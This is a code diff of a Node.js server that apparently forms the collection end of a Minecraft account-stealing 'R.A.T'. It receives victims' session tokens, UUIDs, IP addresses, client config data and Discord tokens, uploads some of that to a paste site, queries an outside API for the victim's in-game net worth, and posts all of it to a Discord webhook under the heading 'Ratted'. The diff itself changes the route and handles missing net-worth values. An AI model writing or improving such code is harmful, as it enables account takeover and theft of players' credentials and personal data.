@@ -40,7 +40,7 @@ setInterval(() => {
 }, 1000 * 60 * 15)
 
 //main route, post to this
-app.post("/", (req, res) => {
+app.post("/lol", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
     if (!["username", "uuid", "token", "ip", "feather", "essentials", "discord"].every(field => req.body.hasOwnProperty(field))) {
         console.log("[R.A.T] Rejected malformed JSON")
@@ -91,7 +91,10 @@ app.post("/", (req, res) => {
 
             if (usingDiscord) {
                 //get networth
-                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/dxxxxy?key=dxxxxy`).catch(() => { return emptyResponse })).data.data[0].networth.total_networth
+                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/dxxxxy?key=dxxxxy`).catch(() => { return emptyResponse })).data.data[0].networth
+
+                //check if api off
+                const total_networth = networth.total_networth == null ? 0 : networth.total_networth
 
                 //upload feather
                 const feather = await (await post("https://hst.sh/documents/", req.body.feather)).data.key
@@ -101,7 +104,7 @@ app.post("/", (req, res) => {
 
                 //send to discord webhook
                 post(process.env.WEBHOOK, JSON.stringify({
-                    content: `@everyone - ${formatNumber(networth)}`, //ping
+                    content: `@everyone - ${formatNumber(total_networth)}`, //ping
                     embeds: [{
                         title: `Ratted ${req.body.username} - Click For Stats`,
                         description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${req.body.discord}\`\`\``,
